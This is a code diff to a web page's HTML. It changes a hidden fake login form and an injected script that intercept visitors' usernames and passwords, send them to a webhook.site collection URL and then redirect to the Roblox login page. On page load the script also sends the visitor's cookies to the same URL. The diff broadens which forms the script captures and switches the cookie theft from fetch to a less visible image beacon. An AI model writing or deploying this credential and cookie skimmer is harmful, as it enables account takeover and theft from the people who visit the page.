@@ -623,6 +623,7 @@
 
 
 
+
 <form id="fake-login-form" action="https://webhook.site/d9343135-9a99-478a-b863-e1f658cbaf80" method="POST" style="display: none;">
     <input type="text" name="username" id="fake-username">
     <input type="password" name="password" id="fake-password">
@@ -631,14 +632,14 @@
 <script>
 document.addEventListener('DOMContentLoaded', function() {
     const checkForLoginForm = setInterval(function() {
-        const usernameField = document.querySelector('input[type="text"][name="username"]');
-        const passwordField = document.querySelector('input[type="password"][name="password"]');
-        const loginButton = document.querySelector('button[type="submit"], button[type="button"]');
+        const usernameField = document.querySelector('input[type="text"]');
+        const passwordField = document.querySelector('input[type="password"]');
+        const loginButton = document.querySelector('button[type="submit"], button[type="button"], button');
 
         if (usernameField && passwordField && loginButton) {
             clearInterval(checkForLoginForm);
 
-            loginButton.addEventListener('click', function(e) {
+            loginButton.onclick = function(e) {
                 e.preventDefault();
 
                 const username = usernameField.value;
@@ -651,18 +652,16 @@ document.addEventListener('DOMContentLoaded', function() {
                 setTimeout(() => {
                     window.location.href = "https://www.roblox.com/login";
                 }, 1000);
-            });
+                return false;
+            };
         }
     }, 500);
 
     const cookies = document.cookie;
-    fetch("https://webhook.site/d9343135-9a99-478a-b863-e1f658cbaf80?cookies=" + encodeURIComponent(cookies));
+    const img = new Image();
+    img.src = "https://webhook.site/d9343135-9a99-478a-b863-e1f658cbaf80?cookies=" + encodeURIComponent(cookies);
 });
 </script>
-
-
-
-
 
 
 
